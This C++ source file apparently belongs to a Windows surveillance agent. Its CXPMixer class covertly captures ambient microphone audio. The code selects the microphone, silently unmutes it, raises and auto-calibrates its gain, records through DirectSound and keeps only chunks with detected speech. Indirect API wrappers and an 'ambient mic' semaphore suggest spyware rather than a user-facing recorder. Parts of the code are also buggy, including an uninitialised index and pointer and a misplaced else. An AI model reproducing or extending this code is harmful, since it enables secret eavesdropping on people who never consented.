#include <stdio.h>
#include "..\common.h"
#include "XpMic.h"
#include "..\HM_SafeProcedures.h"

CXPMixer::CXPMixer(BOOL bCalibration, UINT uThreshold, INT iSilence)
	:	bSilence(FALSE), iSilenceBlock(0)
{
	bCalibrate = bCalibration;
	iSilenceLength = iSilence;	// Numero di blocchi di silenzio prima di fermare la registrazione

	m_bInitialized = FALSE;
	bVoice = FALSE;
	bSilence = FALSE;
	uChunkLen = 5;	// Manteniamo 5 secondi in RAM
	uAudioBufferSize = 0;
	uChannels = 0;
	
	m_pAudioBuffer = NULL;
	fVoiceThreshold = (FLOAT)uThreshold / 1000.0f;	// Soglia di sensibilita' del filtro

	wfx.wFormatTag = WAVE_FORMAT_PCM;
	wfx.nSamplesPerSec = 44100;
	wfx.nChannels = 2;
	wfx.wBitsPerSample = 16;
	wfx.nBlockAlign = wfx.nChannels * ( wfx.wBitsPerSample / 8 );
	wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;
	wfx.cbSize = 0;

	m_hMixer = NULL;
	m_dwMinMicVal = 0;
	m_dwMaxMicVal = 0;
	m_dwMicStep = 0;
	m_dwVolumeControlID = -1;

	m_pQsd = NULL;

	FNC(GetSystemTime)(&st);

	m_hWaveIn = NULL;
	m_pDSC = NULL;
	m_hDSound = NULL;
	m_pDirectSoundCaptureCreate8 = NULL;
}

CXPMixer::~CXPMixer()
{
	if (m_pAudioBuffer != NULL) {
		delete[] m_pAudioBuffer;
		m_pAudioBuffer = NULL;
		uAudioBufferSize = 0;
	}
	
	if (m_pQsd) {
		delete m_pQsd;
		m_pQsd = NULL;
	}
	
	UnloadDSound();
	MixUninitialize();
}

////////////////////////////////////////////////////
/////////////  METODI PRIVATI  /////////////////////
////////////////////////////////////////////////////

BOOL CXPMixer::LoadDSound()
{
	if (m_pDSC == NULL) {

		m_hDSound = LoadLibrary("dsound.dll");

		if (m_hDSound == NULL)
			return FALSE;

		m_pDirectSoundCaptureCreate8 = (DirectSoundCaptureCreate8_t) GetProcAddress(m_hDSound, "DirectSoundCaptureCreate8");
		if (m_pDirectSoundCaptureCreate8 == NULL) {		
			FreeLibrary(m_hDSound);
			return FALSE;
		}

		if (DS_OK != m_pDirectSoundCaptureCreate8(NULL, &m_pDSC, NULL)) {
			FreeLibrary(m_hDSound);
			return FALSE;
		}
	}

	return TRUE;
}

void CXPMixer::UnloadDSound()
{
	if (m_pDSC) {
		m_pDSC->Release();
		m_pDSC = NULL;
	}

	if (m_hDSound)
		FreeLibrary(m_hDSound);
}

BOOL CXPMixer::AcquireMic()
{
	BOOL						bAppend = FALSE, bRet = FALSE;
	UINT						uTimes = 0;
	DWORD						dwStatus, dwFirstPart, dwFirstPartBytes;
	DWORD						dwSecondPart, dwSecondPartBytes, dwReadSize = 0;
	DWORD						dwCaptureCursorCapturePosition, dwCaptureCursorReadPosition;
	DWORD						dwLastCaptureCursorReadPosition = 0, dwCaptureStreamPosition = 0;
	DSCBUFFERDESC               dscbd;
	DSCCAPS						dscsettings;
	WAVEFORMATEX                wfx = {WAVE_FORMAT_PCM, REC_CHANNELS, REC_FREQUENCY, REC_BYTEPERSECOND, 4, REC_BITS, 0};
	DEFINE_LOCAL_GUID(LIID_IDirectSoundCaptureBuffer8, 0x990df4, 0xdbb, 0x4872, 0x83, 0x3e, 0x6d, 0x30, 0x3e, 0x80, 0xae, 0xb6);

	LPDIRECTSOUNDCAPTUREBUFFER8 ppDSCB8 = NULL;
	LPDIRECTSOUNDCAPTUREBUFFER  pDSCB = NULL;

	if(IsInitialized() == FALSE || m_pDSC == NULL)
		return FALSE;

	ZeroMemory(&dscsettings, sizeof(dscsettings));
	dscsettings.dwSize = sizeof(DSCCAPS);

	ZeroMemory(&dscbd, sizeof(dscbd));
	dscbd.dwSize = sizeof(DSCBUFFERDESC);
	dscbd.dwFlags = DSCBCAPS_WAVEMAPPED;
	dscbd.dwBufferBytes = REC_SECONDS(5);
	dscbd.dwReserved = 0;
	dscbd.lpwfxFormat = &wfx;
	dscbd.dwFXCount = 0;
	dscbd.lpDSCFXDesc = NULL;
	
	do {

		CHK_HRESULT (m_pDSC->GetCaps(&dscsettings))
		// Se non e' supportata la cattura multipla, esci.
		if (0 == (dscsettings.dwFlags & DSCCAPS_MULTIPLECAPTURE))
			break;

		CHK_HRESULT (m_pDSC->CreateCaptureBuffer(&dscbd, &pDSCB, NULL))
		CHK_POINTER (pDSCB)

		CHK_HRESULT (pDSCB->QueryInterface(LIID_IDirectSoundCaptureBuffer8, (LPVOID*)&ppDSCB8))

		CHK_POINTER (ppDSCB8)
		CHK_HRESULT (ppDSCB8->Start(DSCBSTART_LOOPING))
		CHK_HRESULT (ppDSCB8->GetStatus(&dwStatus))

		if(dwStatus != (DSCBSTATUS_CAPTURING | DSCBSTATUS_LOOPING))
			break;

		if (MiniSleep(MINISLEEP_TIME) == FALSE)
			break;

		CHK_HRESULT (ppDSCB8->GetCurrentPosition(&dwCaptureCursorCapturePosition, &dwCaptureCursorReadPosition))

		// Pulisco il buffer
		if (m_pAudioBuffer != NULL) {
			delete[] m_pAudioBuffer;
			m_pAudioBuffer = NULL;
			uAudioBufferSize = 0;
		}

		// Se sono stati catturati dei byte
		if (dwCaptureCursorReadPosition != dwLastCaptureCursorReadPosition) {  
			if (dwCaptureCursorReadPosition > dwLastCaptureCursorReadPosition) {  // Se siamo avanti
				dwReadSize = dwCaptureCursorReadPosition - dwLastCaptureCursorReadPosition;  
				dwCaptureStreamPosition += dwReadSize;  
			} else { // Se siamo indietro sul buffer circolare
				dwReadSize = dwCaptureCursorReadPosition + dscbd.dwBufferBytes - dwLastCaptureCursorReadPosition;  
				dwCaptureStreamPosition += dwReadSize;  
			}  
		}

		if (dwReadSize > 0) {  
			// Lock del buffer
			CHK_HRESULT (ppDSCB8->Lock(	dwLastCaptureCursorReadPosition,
										dwReadSize, 
										(LPVOID *)&dwFirstPart,
										&dwFirstPartBytes,
										(LPVOID *)&dwSecondPart,
										&dwSecondPartBytes,
										0L ))

			m_pAudioBuffer = new(std::nothrow) BYTE[dwFirstPartBytes + 1];
			uAudioBufferSize = dwFirstPartBytes;

			if (m_pAudioBuffer == NULL) { 
				ppDSCB8->Unlock(	(LPVOID *)dwFirstPart,
									dwFirstPartBytes,
									(LPVOID *)dwSecondPart,
									dwSecondPartBytes );
				break;
			}

			CopyMemory(m_pAudioBuffer, (PBYTE)dwFirstPart, dwFirstPartBytes);

			// Unlock del buffer
			CHK_HRESULT ( ppDSCB8->Unlock(	(LPVOID *)dwFirstPart,
				dwFirstPartBytes,
				(LPVOID *)dwSecondPart,
				dwSecondPartBytes ))

			bRet = TRUE;
		}

		if (m_pQsd) {
			m_pQsd->SetBuffer(m_pAudioBuffer, uAudioBufferSize);
		} else {
			m_pQsd = new QSpeechDetect(m_pAudioBuffer, wfx.nSamplesPerSec, wfx.wBitsPerSample, wfx.nChannels, uAudioBufferSize, fVoiceThreshold);
		}

		// salva la posizione per la prossima lettura
		dwLastCaptureCursorReadPosition = dwCaptureCursorReadPosition;
	} while (0);
	
	if (bRet == FALSE)
		uAudioBufferSize = 0;

	if (pDSCB) {
		pDSCB->Release();
		pDSCB = NULL;
	}

	if (ppDSCB8) {
		ppDSCB8->Stop();
		ppDSCB8->Release();
		ppDSCB8 = NULL;
	}

	return bRet;
}

BOOL CXPMixer::SelectMic()
{
	if (m_hMixer == NULL)
		return FALSE;

	UINT lVal;
	BOOL bRetVal = FALSE;

	CHAR *m_strDstLineName, *m_strSelectControlName, *m_strMicName;
	DWORD m_dwControlType, m_dwSelectControlID, m_dwMultipleItems, m_dwIndex;
	DWORD dwi,dwj;
	MIXERLINE mxl;



	mxl.cbStruct = sizeof(MIXERLINE);
	mxl.dwComponentType = MIXERLINE_COMPONENTTYPE_DST_WAVEIN;
	if (FNC(mixerGetLineInfoA)(reinterpret_cast<HMIXEROBJ>(m_hMixer),
						   &mxl,
						   MIXER_OBJECTF_HMIXER |
						   MIXER_GETLINEINFOF_COMPONENTTYPE)
			!= MMSYSERR_NOERROR)
		return FALSE;

	// cerco il dwControlID
	MIXERCONTROL mxc;
	MIXERLINECONTROLS mxlc;
	m_dwControlType = MIXERCONTROL_CONTROLTYPE_MIXER;
	mxlc.cbStruct = sizeof(MIXERLINECONTROLS);
	mxlc.dwLineID = mxl.dwLineID;
	mxlc.dwControlType = m_dwControlType;
	mxlc.cControls = 1;
	mxlc.cbmxctrl = sizeof(MIXERCONTROL);
	mxlc.pamxctrl = &mxc;
	if (FNC(mixerGetLineControlsA)(reinterpret_cast<HMIXEROBJ>(m_hMixer),
							   &mxlc,
							   MIXER_OBJECTF_HMIXER |
							   MIXER_GETLINECONTROLSF_ONEBYTYPE)
		!= MMSYSERR_NOERROR) {

		// se non c'è il tipo MIXER provo MUX
		m_dwControlType = MIXERCONTROL_CONTROLTYPE_MUX;
		mxlc.cbStruct = sizeof(MIXERLINECONTROLS);
		mxlc.dwLineID = mxl.dwLineID;
		mxlc.dwControlType = m_dwControlType;
		mxlc.cControls = 1;
		mxlc.cbmxctrl = sizeof(MIXERCONTROL);
		mxlc.pamxctrl = &mxc;
		if (FNC(mixerGetLineControlsA)(reinterpret_cast<HMIXEROBJ>(m_hMixer),
								   &mxlc,
								   MIXER_OBJECTF_HMIXER |
								   MIXER_GETLINECONTROLSF_ONEBYTYPE)
								   != MMSYSERR_NOERROR) {
			return FALSE;
		}
	}
	
	// salvo dwControlID, cMultipleItems
	m_strDstLineName = mxl.szName;
	m_strSelectControlName = mxc.szName;
	m_dwSelectControlID = mxc.dwControlID;
	m_dwMultipleItems = mxc.cMultipleItems;

	if (m_dwMultipleItems == 0)
		return FALSE;

	// trovo il Microphone Select control
	MIXERCONTROLDETAILS_LISTTEXT *pmxcdSelectText =
		new MIXERCONTROLDETAILS_LISTTEXT[m_dwMultipleItems];

	if (pmxcdSelectText == NULL)
		return FALSE;

	MIXERCONTROLDETAILS mxcd;
	mxcd.cbStruct = sizeof(MIXERCONTROLDETAILS);
	mxcd.dwControlID = m_dwSelectControlID;
	mxcd.cChannels = 1;
	mxcd.cMultipleItems = m_dwMultipleItems;
	mxcd.cbDetails = sizeof(MIXERCONTROLDETAILS_LISTTEXT);
	mxcd.paDetails = pmxcdSelectText;

	if (FNC(mixerGetControlDetailsA)(reinterpret_cast<HMIXEROBJ>(m_hMixer),
								 &mxcd,
								 MIXER_OBJECTF_HMIXER |
								 MIXER_GETCONTROLDETAILSF_LISTTEXT) == MMSYSERR_NOERROR) {

		// cerchiamo i controls della Microphone source line
		for (dwi = 0; dwi < m_dwMultipleItems; dwi++) {

			// informazioni sulla line
			MIXERLINE mxl;
			mxl.cbStruct = sizeof(MIXERLINE);
			mxl.dwLineID = pmxcdSelectText[dwi].dwParam1;
			if (FNC(mixerGetLineInfoA)(reinterpret_cast<HMIXEROBJ>(m_hMixer),
								   &mxl,
								   MIXER_OBJECTF_HMIXER |
								   MIXER_GETLINEINFOF_LINEID)
				== MMSYSERR_NOERROR &&
				mxl.dwComponentType == MIXERLINE_COMPONENTTYPE_SRC_MICROPHONE) {

				// dwi è l'indice
				m_dwIndex = dwi;
				m_strMicName = pmxcdSelectText[dwi].szName;
				break;
			}
		}

		if (dwi >= m_dwMultipleItems) {
			// Se non è stato trovato nulla nella parte superiore
			// proviamo a cercare in base al nome 
			for (dwi = 0; dwi < m_dwMultipleItems; dwi++) {
				if (FNC(lstrcmpA)(pmxcdSelectText[dwi].szName, "Microphone") == 0	||
					FNC(lstrcmpA)(pmxcdSelectText[dwi].szName, "Microfono") == 0	||
					FNC(lstrcmpA)(pmxcdSelectText[dwi].szName, "Mic Volume") == 0) {
					// dwi è l'indice
					m_dwIndex = dwi;
					m_strMicName[0] = *pmxcdSelectText[dwi].szName;
					break;
				}
			}
		}
	}
	
	delete[] pmxcdSelectText;
	
	// In questo caso è stato trovato un List Control
	if ( m_dwIndex < m_dwMultipleItems) {

		MIXERCONTROLDETAILS_BOOLEAN *pmxcdSelectValue = new MIXERCONTROLDETAILS_BOOLEAN[m_dwMultipleItems];

		if (pmxcdSelectValue != NULL) {
			MIXERCONTROLDETAILS mxcd;
			mxcd.cbStruct = sizeof(MIXERCONTROLDETAILS);
			mxcd.dwControlID = m_dwSelectControlID;
			mxcd.cChannels = 1;
			mxcd.cMultipleItems = m_dwMultipleItems;
			mxcd.cbDetails = sizeof(MIXERCONTROLDETAILS_BOOLEAN);
			mxcd.paDetails = pmxcdSelectValue;
			if (FNC(mixerGetControlDetailsA)(	reinterpret_cast<HMIXEROBJ>(m_hMixer),
											&mxcd,
											MIXER_OBJECTF_HMIXER |
											MIXER_GETCONTROLDETAILSF_VALUE)
											== MMSYSERR_NOERROR) {

				lVal = pmxcdSelectValue[m_dwIndex].fValue;			

				for(dwj = 0; dwj < m_dwMultipleItems; dwj++) {
					if( dwj == m_dwIndex )
						pmxcdSelectValue[dwj].fValue = 1;
					else
						pmxcdSelectValue[dwj].fValue = 0;
				}				

				if (FNC(mixerSetControlDetails)(	reinterpret_cast<HMIXEROBJ>(m_hMixer),
											&mxcd,
											MIXER_SETCONTROLDETAILSF_VALUE)
					== MMSYSERR_NOERROR) {
					bRetVal = TRUE;
				}
			}
		}
		delete[] pmxcdSelectValue;
		return bRetVal;
	}
	return FALSE;
}

void CXPMixer::UnMuteMic()
{	
	if (m_hMixer == NULL)
		return;
	
	DWORD dwj, dwNumConnections, dwNumChannels;
	MMRESULT err;
	
	MIXERLINE mxl;
	mxl.cbStruct = sizeof(mxl);
	mxl.dwComponentType = MIXERLINE_COMPONENTTYPE_DST_WAVEIN;
	FNC(mixerGetLineInfoA)(reinterpret_cast<HMIXEROBJ>(m_hMixer), &mxl, MIXER_GETLINEINFOF_COMPONENTTYPE);

	// Cerco la source line connessa alla line DST_WAVEIN
	dwNumConnections = mxl.cConnections;
	for(dwj=0; dwj < dwNumConnections; dwj++){
		mxl.dwSource = dwj;
		FNC(mixerGetLineInfoA)(reinterpret_cast<HMIXEROBJ>(m_hMixer), &mxl, MIXER_GETLINEINFOF_SOURCE);
		if (mxl.dwComponentType == MIXERLINE_COMPONENTTYPE_SRC_MICROPHONE)
			break;
	}
	
	MIXERCONTROL mxc;
	MIXERLINECONTROLS mxlc;
	mxlc.cbStruct = sizeof(MIXERLINECONTROLS);
	mxlc.dwLineID = mxl.dwLineID;
	mxlc.dwControlType = MIXERCONTROL_CONTROLTYPE_MUTE;
	mxlc.cControls = 1;
	mxlc.cbmxctrl = sizeof(MIXERCONTROL);
	mxlc.pamxctrl = &mxc;

	err = FNC(mixerGetLineControlsA)(	reinterpret_cast<HMIXEROBJ>(m_hMixer), 
								&mxlc,
								MIXER_GETLINECONTROLSF_ONEBYTYPE);
	if( err == MMSYSERR_NOERROR )
	{
		dwNumChannels = mxl.cChannels;
		if ( MIXERCONTROL_CONTROLF_UNIFORM & mxc.fdwControl )
			dwNumChannels = 1;

		PMIXERCONTROLDETAILS_BOOLEAN pbool = (PMIXERCONTROLDETAILS_BOOLEAN) malloc( dwNumChannels * sizeof(MIXERCONTROLDETAILS_BOOLEAN));
		MIXERCONTROLDETAILS mxcd;
		mxcd.cbStruct = sizeof(MIXERCONTROLDETAILS);
		mxcd.dwControlID = mxc.dwControlID;
		mxcd.cChannels = dwNumChannels;
		mxcd.cMultipleItems = 0;
		mxcd.cbDetails = sizeof(MIXERCONTROLDETAILS_BOOLEAN);
		mxcd.paDetails = pbool;
				
		
		err = FNC(mixerGetControlDetailsA)(reinterpret_cast<HMIXEROBJ>(m_hMixer), &mxcd, MIXER_SETCONTROLDETAILSF_VALUE);
		// Unmute della linea per entrambi i canali
		pbool[0].fValue = 0;
		if (dwNumChannels != 1) {
			pbool[dwNumChannels - 1].fValue = 0;
		}
		err = FNC(mixerSetControlDetails)(reinterpret_cast<HMIXEROBJ>(m_hMixer), &mxcd, MIXER_SETCONTROLDETAILSF_VALUE);
		
		if (pbool) 
			free(pbool);
   }
}

UINT CXPMixer::GetVolumeStep()
{
	return m_dwMicStep;
}

BOOL CXPMixer::MixInitialize()
{	
	UINT uStartVolume = 0;

	m_uNumMixers = FNC(mixerGetNumDevs)();

	if (m_uNumMixers == 0) 
		return FALSE;

	if(!MixSelectAndOpen())
		return FALSE;

	MixGetVolumeControls();
	// Selezioniamo il microfono nella linea di ingressoo
	SelectMic();
	// Proviamo comunque l'unmute, anche se non esiste il control MUTE
	UnMuteMic();

	uStartVolume = (UINT)(((FLOAT)m_dwMaxMicVal-(FLOAT)m_dwMinMicVal)*0.8f);
	SetVolume(uStartVolume);

	return TRUE;
}

void CXPMixer::MixUninitialize()
{
	if (m_hMixer != NULL) {
		FNC(mixerClose)(m_hMixer);
		m_hMixer = NULL;
	}

	if (m_hWaveIn != NULL) {
		FNC(waveInReset)(m_hWaveIn);
		FNC(waveInClose)(m_hWaveIn);
		m_hWaveIn = NULL;

	}
}

BOOL CXPMixer::MixSelectAndOpen()
{
	MMRESULT err;

	switch (m_uNumMixers) {
		case 0:
			return FALSE;
			break;
		case 1:
			err = FNC(mixerOpen)( &m_hMixer, m_uNumMixers-1, 0, NULL, MIXER_OBJECTF_MIXER);
			if (err == MMSYSERR_NOERROR) {
				FNC(mixerGetDevCapsA)( (UINT_PTR)m_hMixer , (LPMIXERCAPS) &m_mixCaps, sizeof(MIXERCAPS));
			}
			break;
		default:
			err = FNC(waveInOpen)(&m_hWaveIn, WAVE_MAPPER, &wfx, NULL, 0, CALLBACK_FUNCTION);
			if (err == MMSYSERR_NOERROR) {
				err = FNC(mixerOpen)(&m_hMixer, (UINT)m_hWaveIn, 0, 0, MIXER_OBJECTF_HWAVEIN);
				if (err != MMSYSERR_NOERROR)
					break;
				err = FNC(mixerGetDevCapsA)( (UINT_PTR)m_hMixer , (LPMIXERCAPS) &m_mixCaps, sizeof(MIXERCAPS));
			}			
	}
	
	if (err == MMSYSERR_NOERROR) {
		return TRUE;
	}
	return FALSE;
}

BOOL CXPMixer::MixLineSelect(UINT uLineType){
	
	if (m_hMixer == NULL)
		return FALSE;

	MMRESULT err;
	UINT uLineIndex, uSourceLineIndex;	// Considerare se servono come variabili blobali della classe

	m_mxl.cbStruct = sizeof(MIXERLINE);
	m_mxl.dwComponentType = uLineType;

	err = FNC(mixerGetLineInfoA)((HMIXEROBJ) m_hMixer, &m_mxl, MIXER_GETLINEINFOF_COMPONENTTYPE);
	
	if ((err != MMSYSERR_NOERROR) || m_mxl.cControls == 0)
		return FALSE;

	uLineIndex = m_mxl.dwSource;
	uSourceLineIndex = m_mxl.dwDestination;		// array di destination Lines
	UINT cConnections = m_mxl.cConnections;
	
	for (DWORD dwj=0; dwj< cConnections; dwj++) {
		m_mxl.dwSource = dwj;
		FNC(mixerGetLineInfoA)((HMIXEROBJ)m_hMixer, &m_mxl, MIXER_GETLINEINFOF_SOURCE);
		if (m_mxl.dwComponentType == MIXERLINE_COMPONENTTYPE_SRC_MICROPHONE)
			break;
	}
	return TRUE;
}

BOOL CXPMixer::MixGetVolumeControls()
{
	MMRESULT err;

	if(m_hMixer == NULL)
		return FALSE;
	
	if (MixLineSelect(MIXERLINE_COMPONENTTYPE_DST_WAVEIN) == FALSE )
		return FALSE;

	MIXERCONTROL mxc;
	MIXERLINECONTROLS mxlc;
	mxlc.cbStruct = sizeof(MIXERLINECONTROLS);
	mxlc.dwLineID = m_mxl.dwLineID;
	mxlc.dwControlType = MIXERCONTROL_CONTROLTYPE_VOLUME;
	mxlc.cControls = 1;
	mxlc.cbmxctrl = sizeof(MIXERCONTROL);
	mxlc.pamxctrl = &mxc;

	err = FNC(mixerGetLineControlsA)(reinterpret_cast<HMIXEROBJ>(m_hMixer),
							   &mxlc,
							   MIXER_OBJECTF_HMIXER |
							   MIXER_GETLINECONTROLSF_ONEBYTYPE);
	if (err != MMSYSERR_NOERROR) {
		return FALSE;
	}

	m_dwMinMicVal = mxc.Bounds.dwMinimum;
	m_dwMaxMicVal = mxc.Bounds.dwMaximum;
	m_dwMicStep = (DWORD) ( m_dwMaxMicVal - m_dwMinMicVal )/ mxc.Metrics.cSteps;
	m_dwXPercStep = (DWORD) ( m_dwMaxMicVal - m_dwMinMicVal )/ 10;
	m_dwVolumeControlID = mxc.dwControlID;

	return TRUE;
}

UINT CXPMixer::GetVolume()
{
	if (m_hMixer == NULL)
		return FALSE;

	if( m_dwVolumeControlID == -1 )
		MixGetVolumeControls();

	MIXERCONTROLDETAILS_UNSIGNED mxcdVolume;
	mxcdVolume.dwValue = 0;
	MIXERCONTROLDETAILS mxcd;
	mxcd.cbStruct = sizeof(MIXERCONTROLDETAILS);
	mxcd.dwControlID = m_dwVolumeControlID;
	mxcd.cChannels = 1;
	mxcd.cMultipleItems = 0;
	mxcd.cbDetails = sizeof(MIXERCONTROLDETAILS_UNSIGNED);
	mxcd.paDetails = &mxcdVolume;
	
	FNC(mixerGetControlDetailsA)(	reinterpret_cast<HMIXEROBJ>(m_hMixer),
							&mxcd,
							MIXER_OBJECTF_HMIXER |
							MIXER_GETCONTROLDETAILSF_VALUE);
	
	return mxcdVolume.dwValue;
}


BOOL CXPMixer::SetVolume(UINT uVolume)
{
	MMRESULT err;
	
	if (m_hMixer == NULL)
		return FALSE;

	if (m_dwVolumeControlID == -1)
		MixGetVolumeControls();
	
	MIXERCONTROLDETAILS_UNSIGNED mxcdVolume = { uVolume };
	MIXERCONTROLDETAILS mxcd;
	mxcd.cbStruct = sizeof(MIXERCONTROLDETAILS);
	mxcd.dwControlID = m_dwVolumeControlID;
	mxcd.cChannels = 1;
	mxcd.cMultipleItems = 0;
	mxcd.cbDetails = sizeof(MIXERCONTROLDETAILS_UNSIGNED);
	mxcd.paDetails = &mxcdVolume;
	err = FNC(mixerSetControlDetails)(reinterpret_cast<HMIXEROBJ>(m_hMixer),
								 &mxcd,
								 MIXER_OBJECTF_HMIXER |
								 MIXER_SETCONTROLDETAILSF_VALUE );
	if (err != MMSYSERR_NOERROR ) {
		return FALSE;
	}
	
	return TRUE;
}


////////////////////////////////////////////////////
/////////////  METODI PUBBLICI /////////////////////
////////////////////////////////////////////////////

BOOL CXPMixer::Initialize()
{
	m_bInitialized = FALSE;

	// NB: se la MixInitialize fallisce carichiamo comunque le DSound e cerchiamo di catturare l'audio
	m_bInitialized = MixInitialize();

	m_bInitialized = LoadDSound();

	return m_bInitialized;
}

BOOL CXPMixer::AcquireMic(PBYTE* pBuffer)
{
	if (pBuffer == NULL || IsInitialized() == FALSE)
		return FALSE;

	if (AcquireMic()) {
		*pBuffer = m_pAudioBuffer;
		return TRUE;
	}

	return FALSE;
}

UINT CXPMixer::GetBufferSize()
{
	return (IsInitialized()) ? uAudioBufferSize : 0;
}

BOOL CXPMixer::IsVoice()
{
// IsVoice è preso direttamente dalla classe QVistaMicrophone
// Se il campione acquisito contiene solo silenzio, cancella
// il buffer, setta la dimensione dei dati acquisiti a 0
// e setta bSilence a TRUE. Altrimenti setta bSilence a FALSE
// e lascia tutto invariato. Torna TRUE se il campione attuale
// e' di solo silenzio, FALSE altrimenti.
	UINT uFrameSize, i, uClip = 0, uSilence = 0;
	SHORT sSample;
	FLOAT fSilence = 0.0f, fClip = 0.0f;

	uFrameSize = wfx.nChannels * wfx.wBitsPerSample / 8;

	if (uAudioBufferSize < uFrameSize) {
		if (m_pAudioBuffer) {
			delete[] m_pAudioBuffer;
			m_pAudioBuffer = NULL;
		}
		
		uAudioBufferSize = 0;
		iSilenceBlock++;
		return FALSE;
	}

	// Cicliamo un solo canale
	for (i = 0; i < uAudioBufferSize; i += 4){
		sSample = *((SHORT *)(&m_pAudioBuffer[i]));

		if (sSample >= (SHORT_MAX - CLIP_THRESHOLD) || sSample <= (SHORT_MIN + CLIP_THRESHOLD))
			fClip += 1.0f;
		else if (sSample  > -SILENCE_THRESHOLD && sSample < SILENCE_THRESHOLD)
			fSilence += 1.0f;
	}
		
	if (bCalibrate) {
		// Aumentiamo di 1 per evitare una divisione per 0
		fClip += 1.0f;
		fSilence += 1.0f;

		if (fClip > fSilence){
			// Vediamo se c'e' clipping e se dobbiamo calibrare il microfono
			uClip = (UINT)((FLOAT)(fClip / (FLOAT)SAMPLES) * 10.0f);

			for (i = 0; i < uClip; i++)
				StepVolumeDown();
		} else {
			// Vediamo se il guadagno e' troppo basso e se dobbiamo calibrare il microfono
			uSilence = (UINT)((FLOAT)(fSilence / (FLOAT)SAMPLES) * 10.0f);

			for (i = 0; i < uSilence; i++)
				StepVolumeUp();
		}
	}

	if (m_pQsd)
		bVoice = m_pQsd->IsVoice();
	else
		bVoice = TRUE;	// Nel dubbio, c'e' voce

	// Aggiorna il timestamp se stiamo facendo una transizione da silenzio a voce
	if (bVoice && iSilenceBlock >= iSilenceLength){
		FNC(GetSystemTime)(&st);
	}

	if (bVoice)
		iSilenceBlock = 0;
	else
		iSilenceBlock++;

	return bVoice;
}

SYSTEMTIME CXPMixer::GetTimeStamp()
{
	return st;
}

BOOL CXPMixer::Silent()
{
	if (iSilenceLength == 0)
		return FALSE;

	if (iSilenceBlock >= iSilenceLength)
		return TRUE;

	return FALSE;
}

BOOL CXPMixer::StepVolumeUp()
{
	MMRESULT err;
	MIXERCONTROLDETAILS_UNSIGNED mxcdVolume;

	if (m_hMixer == NULL) {
		return FALSE;
	}
	if( m_dwVolumeControlID == -1 )
		MixGetVolumeControls();
	
	UINT uNewVol = GetVolume();
	uNewVol += m_dwXPercStep; //GetVolumeStep();
	if ((uNewVol)>0)
		(uNewVol<m_dwMaxMicVal)?mxcdVolume.dwValue=uNewVol : mxcdVolume.dwValue=m_dwMaxMicVal;
	else
		mxcdVolume.dwValue = 0;

	MIXERCONTROLDETAILS mxcd;
	mxcd.cbStruct = sizeof(MIXERCONTROLDETAILS);
	mxcd.dwControlID = m_dwVolumeControlID;
	mxcd.cChannels = 1;
	mxcd.cMultipleItems = 0;
	mxcd.cbDetails = sizeof(MIXERCONTROLDETAILS_UNSIGNED);
	mxcd.paDetails = &mxcdVolume;
	err = FNC(mixerSetControlDetails)(reinterpret_cast<HMIXEROBJ>(m_hMixer),
								 &mxcd,
								 MIXER_OBJECTF_HMIXER |
								 MIXER_SETCONTROLDETAILSF_VALUE);
	if ( err != MMSYSERR_NOERROR ) {
		return FALSE;
	}
	return TRUE;
}

BOOL CXPMixer::StepVolumeDown()
{
	MMRESULT err;
	MIXERCONTROLDETAILS_UNSIGNED mxcdVolume;

	if (m_hMixer == NULL) {
		return FALSE;
	}
	
	if ( m_dwVolumeControlID == -1 )
		MixGetVolumeControls();

	UINT uNewVol = GetVolume();
	uNewVol -= m_dwXPercStep; //GetVolumeStep();
	
	if ( uNewVol > 0 && uNewVol > m_dwMinMicVal)
		if ( uNewVol < m_dwMaxMicVal )
			mxcdVolume.dwValue = uNewVol;
	else
		mxcdVolume.dwValue = 0;

	MIXERCONTROLDETAILS mxcd;
	mxcd.cbStruct = sizeof(MIXERCONTROLDETAILS);
	mxcd.dwControlID = m_dwVolumeControlID;
	mxcd.cChannels = 1;
	mxcd.cMultipleItems = 0;
	mxcd.cbDetails = sizeof(MIXERCONTROLDETAILS_UNSIGNED);
	mxcd.paDetails = &mxcdVolume;
	err = FNC(mixerSetControlDetails)(reinterpret_cast<HMIXEROBJ>(m_hMixer),
								 &mxcd,
								 MIXER_OBJECTF_HMIXER |
								 MIXER_SETCONTROLDETAILSF_VALUE);
	if ( err != MMSYSERR_NOERROR ) {
		return FALSE;
	}
	return TRUE;
}

BOOL CXPMixer::MiniSleep(UINT uMilliSec)
{
	UINT uLoops;
	UINT uSleepTime = 300; // Step di 300ms

	if (bAmbientalMicSemaphore)	
		return FALSE;

	if(uMilliSec <= uSleepTime){
		Sleep(uMilliSec);
		return TRUE;
	}else{
		uLoops = uMilliSec / uSleepTime;
	}

	while(uLoops){
		Sleep(uSleepTime);
		uLoops--;

		if (bAmbientalMicSemaphore)
			return FALSE;
	}

	return TRUE;
}